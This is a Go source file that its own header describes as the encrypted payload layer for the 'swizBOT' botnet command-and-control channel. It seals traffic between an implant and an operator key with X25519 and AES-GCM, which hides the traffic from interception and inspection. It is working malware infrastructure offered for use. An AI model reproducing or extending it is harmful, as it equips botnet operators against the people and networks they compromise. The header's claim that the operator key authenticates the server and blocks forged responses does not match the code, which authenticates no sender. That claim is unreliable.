// Package channel provides the APT-grade payload layer for the
// swizBOT C2 channel: ephemeral X25519 + AES-256-GCM with a static
// operator key authenticating the server to the implant.
//
// Wire format for a sealed payload:
//
//	[ 32 bytes ] ephemeral X25519 public key
//	[ 12 bytes ] AES-GCM nonce
//	[    rest  ] AES-256-GCM ciphertext (seal = encrypt-then-auth)
//
// Per-message ephemeral keys give forward secrecy; only the holder of
// the operator private key can decrypt, so a MITM cannot read or forge
// checkin responses even with a valid TLS-intercepting position.
package channel

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/ecdh"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"io"
)

const (
	// PublicKeyLen / PrivateKeyLen are X25519 key sizes in bytes.
	PublicKeyLen  = 32
	PrivateKeyLen = 32
	nonceLen      = 12
)

// ParsePrivateKey decodes a hex X25519 private key.
func ParsePrivateKey(hexKey string) (*ecdh.PrivateKey, error) {
	raw, err := hex.DecodeString(hexKey)
	if err != nil {
		return nil, fmt.Errorf("key is not hex: %w", err)
	}
	if len(raw) != PrivateKeyLen {
		return nil, fmt.Errorf("private key must be %d bytes, got %d", PrivateKeyLen, len(raw))
	}
	return ecdh.X25519().NewPrivateKey(raw)
}

// ParsePublicKey decodes a hex X25519 public key.
func ParsePublicKey(hexKey string) (*ecdh.PublicKey, error) {
	raw, err := hex.DecodeString(hexKey)
	if err != nil {
		return nil, fmt.Errorf("key is not hex: %w", err)
	}
	if len(raw) != PublicKeyLen {
		return nil, fmt.Errorf("public key must be %d bytes, got %d", PublicKeyLen, len(raw))
	}
	return ecdh.X25519().NewPublicKey(raw)
}

// GeneratePrivateKey creates a fresh operator key and returns the hex
// private and public forms.
func GeneratePrivateKey() (privHex, pubHex string, err error) {
	priv, err := ecdh.X25519().GenerateKey(rand.Reader)
	if err != nil {
		return "", "", err
	}
	return hex.EncodeToString(priv.Bytes()), hex.EncodeToString(priv.PublicKey().Bytes()), nil
}

// Seal encrypts plaintext for the operator: a fresh ephemeral key is
// generated, the shared secret is derived against the operator public
// key, and the payload is AEAD-sealed. The ephemeral public key travels
// in-band so the operator can derive the same secret.
func Seal(operatorPub *ecdh.PublicKey, plaintext []byte) ([]byte, error) {
	eph, err := ecdh.X25519().GenerateKey(rand.Reader)
	if err != nil {
		return nil, err
	}
	secret, err := eph.ECDH(operatorPub)
	if err != nil {
		return nil, err
	}
	aead, err := newAEAD(secret)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, nonceLen)
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}
	out := make([]byte, 0, PublicKeyLen+nonceLen+len(plaintext)+aead.Overhead())
	out = append(out, eph.PublicKey().Bytes()...)
	out = append(out, nonce...)
	return aead.Seal(out, nonce, plaintext, nil), nil
}

// Open decrypts a Sealed payload using the operator private key.
func Open(operatorPriv *ecdh.PrivateKey, sealed []byte) ([]byte, error) {
	if len(sealed) < PublicKeyLen+nonceLen {
		return nil, fmt.Errorf("sealed payload too short (%d bytes)", len(sealed))
	}
	ephPub, err := ecdh.X25519().NewPublicKey(sealed[:PublicKeyLen])
	if err != nil {
		return nil, fmt.Errorf("bad ephemeral key: %w", err)
	}
	secret, err := operatorPriv.ECDH(ephPub)
	if err != nil {
		return nil, err
	}
	aead, err := newAEAD(secret)
	if err != nil {
		return nil, err
	}
	nonce := sealed[PublicKeyLen : PublicKeyLen+nonceLen]
	ct := sealed[PublicKeyLen+nonceLen:]
	plain, err := aead.Open(nil, nonce, ct, nil)
	if err != nil {
		return nil, fmt.Errorf("decrypt failed: %w", err)
	}
	return plain, nil
}

func newAEAD(secret []byte) (cipher.AEAD, error) {
	block, err := aes.NewCipher(secret)
	if err != nil {
		return nil, err
	}
	return cipher.NewGCM(block)
}
